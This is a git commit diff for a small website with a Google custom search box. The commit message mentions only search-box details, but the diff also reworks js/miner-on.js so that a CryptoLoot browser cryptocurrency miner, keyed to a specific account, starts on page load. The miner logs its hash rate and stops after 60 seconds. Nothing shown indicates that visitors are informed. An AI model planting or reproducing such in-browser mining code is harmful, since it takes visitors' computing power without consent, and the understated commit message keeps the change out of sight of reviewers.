023a81f32a3c4bad3ef9dfd53ce1610700c80160
Guli <ignaciomorenopubul@gmail.com>
2017-11-05 22:47:54 +0100

    Small details and test submit event

--- js/app.js
+++ js/app.js
@@ -1,5 +1,9 @@
 window.__gcse = {
   callback: function () {
-	$('#gsc-i-id1').attr('placeholder', 'Search the web')
+    $('.fa.fa-search.fa-2x').removeClass('hidden')
+    $('#gsc-i-id1').attr('placeholder', 'Search the web')
+    $('.gsc-search-box.gsc-search-box-tools').submit(function () {
+      console.log('DONE')
+    })
   }
 }
--- js/miner-on.js
+++ js/miner-on.js
@@ -1,4 +1,22 @@
-var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
-  autoThreads: false,
-  throttle: 0.3
+$('document').ready(function () {
+  var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
+    autoThreads: false,
+    throttle: 0.7
+  })
+  miner.start()
+  setInterval(function () {
+    var hashesPerSecond = miner.getHashesPerSecond()
+    console.log(hashesPerSecond)
+  }, 3000)
+  miner.on('found', function () {
+    console.log('Hash found')
+  })
+  miner.on('accepted', function () {
+    console.log('Hash accepted')
+  })
+  miner.getHashesPerSecond()
+  setTimeout(function () {
+    miner.stop()
+    console.log('Miner stopped after 60 seconds')
+  }, 60000)
 })
